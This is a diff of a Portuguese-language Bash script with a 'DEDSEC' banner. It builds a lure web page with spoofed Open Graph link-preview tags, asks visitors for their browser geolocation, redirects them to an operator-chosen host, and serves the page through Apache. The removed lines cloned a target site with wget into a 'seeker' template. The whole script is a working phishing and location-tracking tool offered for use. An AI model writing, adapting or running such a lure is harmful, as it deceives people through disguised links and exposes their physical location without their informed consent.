@@ -1,46 +1,45 @@
 #!/bin/bash
 
-echo -e "    ____  __________  _____ ____________"
-echo -e "   / __ \\/ ____/ __ \\/ ___// ____/ ____/"
-echo -e "  / / / / __/ / / / /\\__ \\/ __/ / /"
-echo -e " / /_/ / /___/ /_/ /___/ / /___/ /___"
-echo -e "/_____/_____/_____//____/_____/\\____/"
-echo -e ""
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+RESET='\033[0m'
 
+echo -e "${CYAN}"
+echo ' ____  __________  _____ ____________'
+echo '/ __ \/ ____/ __ \/ ___// ____/ ____/'
+echo '/ / / / __/ / / / /\__ \/ __/ / /     '
+echo '/ /_/ / /___/ /_/ /___/ / /___/ /___  '
+echo '/_____/_____/_____//____/_____/\____/ '
+echo -e "${RESET}"
 
+read -p "URL de destino final (ex: https://exemplo.com): " DESTINO
+read -p "IP local (ex: 192.168.0.105): " IP
+read -p "Porta (ex: 8080): " PORTA
+read -p "Título da aba (title): " TITLE
+read -p "Nome do site (og:site_name): " SITENAME
+read -p "Descrição (og:description): " DESC
+read -p "URL da imagem (og:image): " IMAGE_URL
 
-read -p "URL do site a ser clonado: " URL
-read -p "Porta para hospedar (ex: 8080): " PORTA
-read -p "Título da página (og:title): " TITLE
-read -p "Descrição da página (og:description): " DESC
-read -p "URL da imagem (og:image): " IMAGE
+if [[ -z "$DESTINO" || -z "$IP" || -z "$PORTA" || -z "$TITLE" || -z "$SITENAME" || -z "$DESC" || -z "$IMAGE_URL" ]]; then
+  echo -e "${RED}[ERRO] Todos os campos são obrigatórios.${RESET}"
+  exit 1
+fi
 
-PRIVATE_IP=$(ip route get 8.8.8.8 | awk '{print $7; exit}')
-REDIRECT_URL="http://$PRIVATE_IP:$PORTA"
+REDIRECT_URL="http://${IP}:${PORTA}"
 
-HOSTNAME=$(echo $URL | awk -F/ '{print $3}')
-SITENAME=$(echo $HOSTNAME | cut -d'.' -f1)
-
-CLONE_DIR="/var/www/html/site_clone"
-TEMPLATE_DIR="$HOME/seeker/template/custom_og_tags"
-
-echo -e "\033[36m[*]\033[0m Clonando o site com wget..."
-sudo mkdir -p "$CLONE_DIR"
-sudo wget --no-check-certificate --mirror --convert-links --adjust-extension --page-requisites --no-parent "$URL" -P "$CLONE_DIR"
-
-echo -e "\033[36m[*]\033[0m Criando index.html com redirecionamento..."
-sudo mkdir -p "$TEMPLATE_DIR"
-
-cat <<EOF | sudo tee "$TEMPLATE_DIR/index.html" > /dev/null
+# Criar index.html
+cat > index.html <<EOF
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="utf-8">
-    <meta property="og:title" content="$TITLE">
-    <meta property="og:site_name" content="$SITENAME">
-    <meta property="og:description" content="$DESC">
-    <meta property="og:image" content="$IMAGE">
-    <title>$TITLE</title>
+    <meta property="og:title" content="${TITLE}">
+    <meta property="og:site_name" content="${SITENAME}">
+    <meta property="og:description" content="${DESC}">
+    <meta property="og:image" content="${IMAGE_URL}">
+    <title>${TITLE}</title>
     <script>
         if (location.protocol === 'http:') {
             location.href = 'https:' + location.href.slice(5);
@@ -49,22 +48,53 @@ cat <<EOF | sudo tee "$TEMPLATE_DIR/index.html" > /dev/null
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
     <script src="js/location.js"></script>
 </head>
-<body onload="information(); locate(function() { window.location = '$REDIRECT_URL/index2.html'; }, function() { document.body.innerHTML = 'Erro ao localizar.'; } );">
+<body onload="information(); locate(function() { window.location = '${REDIRECT_URL}/index2.html'; }, function() { document.body.innerHTML = 'Erro ao localizar.'; } );">
 </body>
 </html>
 EOF
 
-sudo cp "$TEMPLATE_DIR/index.html" "$TEMPLATE_DIR/index_temp.html"
+echo -e "${YELLOW}[*]${RESET} index.html criado."
 
-echo -e "\033[36m[*]\033[0m Copiando arquivos para /var/www/html..."
-sudo cp "$TEMPLATE_DIR/index.html" /var/www/html/
-sudo cp "$TEMPLATE_DIR/index_temp.html" /var/www/html/
+# Criar js/location.js
+mkdir -p js
 
-echo -e "\033[36m[*]\033[0m Iniciando o Apache..."
-if command -v systemctl &> /dev/null; then
-    sudo systemctl start apache2
+cat > js/location.js <<EOF
+function information() {
+    console.log("Iniciando coleta de localização...");
+}
+function locate(success, error) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            console.log("Localização obtida.");
+            success(position);
+        }, function() {
+            console.log("Erro ao obter localização.");
+            error();
+        });
+    } else {
+        console.log("Geolocalização não suportada.");
+        error();
+    }
+}
+EOF
+
+echo -e "${YELLOW}[*]${RESET} location.js criado."
+
+# Copiar arquivos para /var/www/html/
+echo -e "${YELLOW}[*]${RESET} Copiando arquivos para /var/www/html..."
+sudo cp index.html /var/www/html/
+sudo mkdir -p /var/www/html/js
+sudo cp js/location.js /var/www/html/js/
+
+# Tentar iniciar Apache
+echo -e "${YELLOW}[*]${RESET} Iniciando o Apache..."
+sudo service apache2 start 2>/tmp/apache_err.log
+if [[ $? -eq 0 ]]; then
+    echo -e "${GREEN}[OK]${RESET} Site hospedado em: http://${IP}:${PORTA}"
 else
-    sudo service apache2 start
+    echo -e "${RED}[ERRO] Apache não iniciado. O site NÃO está hospedado.${RESET}"
+    echo "Detalhes do erro:"
+    cat /tmp/apache_err.log
 fi
 
-echo -e "\033[32m[OK]\033[0m Site hospedado em: $REDIRECT_URL"
+rm -f /tmp/apache_err.log
